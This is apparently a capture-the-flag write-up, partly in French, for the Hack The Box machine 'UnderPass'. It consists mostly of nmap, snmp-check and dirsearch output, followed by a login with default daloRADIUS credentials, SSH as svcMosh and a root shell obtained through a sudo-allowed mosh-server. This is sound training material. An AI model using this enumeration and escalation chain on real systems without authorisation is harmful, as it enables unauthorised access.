
```bash
──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/UnderPass]
└─$ nmap -sV -sC -p- -vv 10.10.11.48 -oN underpass.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 18:03 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
Initiating Ping Scan at 18:03
Scanning 10.10.11.48 [4 ports]
Completed Ping Scan at 18:03, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:03
Completed Parallel DNS resolution of 1 host. at 18:03, 0.01s elapsed
Initiating SYN Stealth Scan at 18:03
Scanning 10.10.11.48 [65535 ports]
Discovered open port 22/tcp on 10.10.11.48
Discovered open port 80/tcp on 10.10.11.48
Completed SYN Stealth Scan at 18:03, 15.36s elapsed (65535 total ports)
Initiating Service scan at 18:03
Scanning 2 services on 10.10.11.48
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Completed Service scan at 18:03, 6.09s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.48.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 1.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.11s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
Nmap scan report for 10.10.11.48
Host is up, received echo-reply ttl 63 (0.027s latency).
Scanned at 2025-01-26 18:03:09 CET for 23s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.93 seconds
           Raw packets sent: 66195 (2.913MB) | Rcvd: 65627 (2.625MB)
```
```bash
nmap -sU --top-ports 100 -vv 10.10.11.48 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 19:13 CET
Initiating Ping Scan at 19:13
Scanning 10.10.11.48 [4 ports]
Completed Ping Scan at 19:13, 1.36s elapsed (1 total hosts)
Initiating UDP Scan at 19:13
Scanning underpass.htb (10.10.11.48) [100 ports]
Discovered open port 161/udp on 10.10.11.48
Increasing send delay for 10.10.11.48 from 0 to 50 due to 11 out of 18 dropped probes since last increase.
Increasing send delay for 10.10.11.48 from 50 to 100 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.11.48 from 100 to 200 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.11.48 from 200 to 400 due to max_successful_tryno increase to 6
UDP Scan Timing: About 40.00% done; ETC: 19:14 (0:00:47 remaining)
Increasing send delay for 10.10.11.48 from 400 to 800 due to 11 out of 15 dropped probes since last increase.
UDP Scan Timing: About 66.38% done; ETC: 19:14 (0:00:31 remaining)
Completed UDP Scan at 19:14, 103.61s elapsed (100 total ports)
Nmap scan report for underpass.htb (10.10.11.48)
Host is up, received reset ttl 63 (0.075s latency).
Scanned at 2025-01-26 19:13:13 CET for 104s
Not shown: 97 closed udp ports (port-unreach)
PORT     STATE         SERVICE REASON
161/udp  open          snmp    udp-response ttl 63
1812/udp open|filtered radius  no-response
1813/udp open|filtered radacct no-response

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 105.08 seconds
           Raw packets sent: 266 (18.166KB) | Rcvd: 187 (20.910KB)

```

```
┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/UnderPass]
└─$ snmp-check -c public -p 161 10.10.11.48
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.11.48
  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
  Contact                       : steve@underpass.htb
  Location                      : Nevada, U.S.A. but not Vegas
  Uptime snmp                   : 19:39:14.46
  Uptime system                 : 19:39:03.51
  System date                   : 2025-1-26 18:16:31.0
```

```
┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/UnderPass]
└─$ dirsearch -u "http://underpass.htb/daloradius/" -t 50
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                                                                
                                                                                                                                                                                       
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/keylloger/Bureau/VM/HTB/EASY/UnderPass/reports/http_underpass.htb/_daloradius__25-01-26_19-21-35.txt

Target: http://underpass.htb/

[19:21:35] Starting: daloradius/                                                                                                                                                       
[19:21:38] 200 -  221B  - /daloradius/.gitignore                            
[19:21:43] 301 -  323B  - /daloradius/app  ->  http://underpass.htb/daloradius/app/
[19:21:45] 200 -   24KB - /daloradius/ChangeLog                             
[19:21:46] 200 -    2KB - /daloradius/docker-compose.yml                    
[19:21:46] 200 -    2KB - /daloradius/Dockerfile                            
[19:21:46] 301 -  323B  - /daloradius/doc  ->  http://underpass.htb/daloradius/doc/
[19:21:49] 301 -  327B  - /daloradius/library  ->  http://underpass.htb/daloradius/library/
[19:21:49] 200 -   18KB - /daloradius/LICENSE                               
[19:21:53] 200 -   10KB - /daloradius/README.md                             
[19:21:54] 301 -  325B  - /daloradius/setup  ->  http://underpass.htb/daloradius/setup/
                                                                             
Task Completed                                                                                                                                                                         

```

```
┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/UnderPass]
└─$ dirsearch -u "http://underpass.htb/daloradius/app" -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                                                                
                                                                                                                                                                                       
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 220545

Output File: /home/keylloger/Bureau/VM/HTB/EASY/UnderPass/reports/http_underpass.htb/_daloradius_app_25-01-26_19-27-55.txt

Target: http://underpass.htb/

[19:27:55] Starting: daloradius/app/                                                                                                                                                   
[19:27:55] 301 -  330B  - /daloradius/app/common  ->  http://underpass.htb/daloradius/app/common/
[19:27:56] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/users/
[19:28:05] 301 -  333B  - /daloradius/app/operators  ->  http://underpass.htb/daloradius/app/operators/
                                                                              
Task Completed
```

Sur cet pages : http://underpass.htb/daloradius/app/operators/
Les credential par default fonctionne 

En cherchant je tombe sur les creds du compte : svcMosh 

```
┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/UnderPass]
└─$ ssh svcMosh@10.10.11.48
svcMosh@10.10.11.48's password: 
Permission denied, please try again.
svcMosh@10.10.11.48's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jan 26 06:45:00 PM UTC 2025

  System load:  0.15              Processes:             252
  Usage of /:   78.1% of 6.56GB   Users logged in:       1
  Memory usage: 32%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jan 26 18:43:49 2025 from 127.0.0.1
svcMosh@underpass:~$ 
```

```
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
svcMosh@underpass:~$ 
```

Aves quelque recherche et la commande: mosh -h


on arrive a nos fin
```
root@underpass:~# pwd
/root
root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
root@underpass:~# ls 
hi.txt  root.txt
root@underpass:~#
```
